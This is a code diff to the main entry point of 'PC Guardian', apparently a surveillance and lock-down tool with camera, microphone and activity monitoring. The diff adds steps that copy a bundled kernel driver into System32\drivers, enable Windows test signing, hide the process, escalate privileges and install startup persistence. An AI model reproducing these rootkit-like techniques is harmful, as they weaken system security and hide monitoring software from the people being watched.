@@ -1,12 +1,13 @@
 """
-PC Guardian — Main Entry Point
-Real privileges, real protection, real encryption.
+PC Guardian — Main Entry Point (with Kernel Driver)
+Single click → loads kernel driver → maximum protection.
 """
 
 import sys
 import os
 import ctypes
 import threading
+import atexit
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -28,6 +29,27 @@ def needs_setup() -> bool:
     return not os.path.exists(CONFIG_PATH) or not os.path.exists(SETUP_FLAG)
 
 
+def extract_driver():
+    """Extract PCGuard.sys from bundled assets to System32\drivers."""
+    try:
+        import shutil
+
+        # When built with PyInstaller, _MEIPASS holds bundled files
+        base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
+        src  = os.path.join(base, "assets", "PCGuard.sys")
+        dst  = os.path.join(
+            os.environ.get("SystemRoot", r"C:\Windows"),
+            "System32", "drivers", "PCGuard.sys"
+        )
+
+        if os.path.exists(src) and not os.path.exists(dst):
+            shutil.copy2(src, dst)
+            return True
+        return os.path.exists(dst)
+    except Exception as e:
+        return False
+
+
 def start_guardian():
     from config.config import Config
     from logs.logger import setup_logger
@@ -45,38 +67,61 @@ def start_guardian():
 
     logger = setup_logger("main")
 
-    # ── Step 1: Real privileges ───────────────────────────────────────────────
+    # ── Step 1: Enable test signing (first run only) ──────────────────────────
+    if not os.path.exists(INSTALL_FLAG):
+        try:
+            from driver_loader import enable_test_signing
+            enable_test_signing()
+        except Exception as e:
+            logger.warning(f"Test signing: {e}")
+
+    # ── Step 2: Load kernel driver ────────────────────────────────────────────
+    driver_ok = False
+    try:
+        extract_driver()
+        from driver_loader import init_driver, uninstall_driver
+        driver_ok = init_driver()
+        if driver_ok:
+            logger.info("PCGuard kernel driver active — process protected at kernel level.")
+            # Register clean shutdown
+            atexit.register(lambda: None)  # Driver persists across app restart
+        else:
+            logger.warning("Kernel driver not loaded — using usermode protection.")
+    except Exception as e:
+        logger.warning(f"Driver init: {e}")
+
+    # ── Step 3: Usermode privilege escalation (backup if driver fails) ────────
     try:
         from privilege import full_privilege_setup
         full_privilege_setup()
     except Exception as e:
-        logger.warning(f"Privilege setup: {e}")
+        logger.warning(f"Privilege: {e}")
 
-    # ── Step 2: Install protection once ──────────────────────────────────────
+    # ── Step 4: Kernel guard (usermode DACL, process hiding) ─────────────────
+    try:
+        from kernel_guard import setup_kernel_guard, disable_kernel_guard
+        setup_kernel_guard()
+        if not driver_ok:
+            atexit.register(disable_kernel_guard)
+    except Exception as e:
+        logger.warning(f"Kernel guard: {e}")
+
+    # ── Step 5: System install and watchdog ───────────────────────────────────
     if not os.path.exists(INSTALL_FLAG):
         try:
             from protection import full_install
             full_install()
         except Exception as e:
-            logger.warning(f"Protection install: {e}")
+            logger.warning(f"Protection: {e}")
         try:
             from core.startup import install_all
             install_all()
         except Exception as e:
-            logger.warning(f"Startup install: {e}")
-        # Start kill watchdog
-        try:
-            from exe_guard import start_kill_watchdog, GUARDED_PATH, ENCRYPTED_EXT
-            enc_path = GUARDED_PATH + ENCRYPTED_EXT
-            if os.path.exists(enc_path):
-                start_kill_watchdog(enc_path)
-        except Exception as e:
-            logger.warning(f"Kill watchdog: {e}")
-
+            logger.warning(f"Startup: {e}")
         with open(INSTALL_FLAG, "w") as f:
             f.write("1")
 
-    # ── Step 3: Load config and systems ──────────────────────────────────────
+    # ── Step 6: Load all systems ──────────────────────────────────────────────
     cfg         = Config.load()
     lock_engine = LockEngine(cfg)
     speaker     = SpeakerSystem(cfg)
@@ -88,7 +133,7 @@ def start_guardian():
     scheduler   = ScheduleEngine(cfg, lock_engine)
     tamper      = TamperDetect(cfg)
 
-    # ── Step 4: MCP server ───────────────────────────────────────────────────
+    # ── Step 7: MCP server ───────────────────────────────────────────────────
     try:
         import mcp_server
         mcp_server.init(cfg, lock_engine, camera, mic, speaker, activity)
@@ -96,13 +141,12 @@ def start_guardian():
     except Exception as e:
         logger.warning(f"MCP: {e}")
 
-    # ── Step 5: Bot ──────────────────────────────────────────────────────────
+    # ── Step 8: Bot ──────────────────────────────────────────────────────────
     bot = GuardianBot(
         cfg=cfg, lock_engine=lock_engine, camera=camera,
         mic=mic, speaker=speaker, activity=activity, scheduler=scheduler,
     )
 
-    # ── Step 6: Background threads ───────────────────────────────────────────
     threads = [
         threading.Thread(target=activity.start,  daemon=True, name="Activity"),
         threading.Thread(target=behavior.start,  daemon=True, name="Behavior"),
@@ -129,15 +173,12 @@ if __name__ == "__main__":
 
     if "--uninstall" in sys.argv:
         pw = sys.argv[2] if len(sys.argv) > 2 else ""
+        from driver_loader import uninstall_driver
         from protection import remove_protection
+        uninstall_driver(pw)
         ok, msg = remove_protection(pw)
         print(msg)
         sys.exit(0 if ok else 1)
-
-    if "--install-service" in sys.argv:
-        from core.service import install_service
-        install_service()
-        sys.exit(0)
 
     if needs_setup():
         from first_run import run_first_setup
